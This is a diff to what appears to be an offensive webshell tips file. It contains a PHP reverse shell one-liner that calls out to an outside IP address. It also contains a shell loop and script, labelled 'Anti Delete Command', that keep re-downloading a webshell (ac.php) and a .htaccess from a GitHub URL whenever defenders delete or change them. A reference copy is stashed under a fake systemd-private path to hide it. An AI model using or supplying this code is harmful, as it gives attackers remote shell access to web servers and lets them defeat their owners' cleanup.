@@ -20,16 +20,25 @@ php -r '$sock=fsockopen("104.248.145.105",1234);shell_exec("sh <&3 >&3 2>&3");'
 # Tips & Trick Bypass Webshell / Crack Other Things / Defender Stuff
 ### Anti Delete Command : 
 ```
-while true; do echo $(TZ=Asia/Jakarta date) && if [ ! -f ac.php ]; then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi && if ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess; fi && echo $(TZ=Asia/Jakarta date) && sleep 3; done
+curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a && sleep 2 && while true; do echo $(TZ=Asia/Jakarta date) && if [ ! -f ac.php ]; then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi && if ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess; fi && echo $(TZ=Asia/Jakarta date) && sleep 2; done
 ```
 #### Script
 ```
 #!/bin/bash
 
-while true; do 
+# Download initial .htaccess file
+curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a
+sleep 2
+
+# Loop to check for changes in files
+while true; do
     echo $(TZ=Asia/Jakarta date)
-    if [ ! -f ac.php ]; then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi
-    ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a && curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess
+    if [ ! -f ac.php ]; then
+        curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php
+    fi
+    if ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then
+        curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess
+    fi
     echo $(TZ=Asia/Jakarta date)
     sleep 2
 done
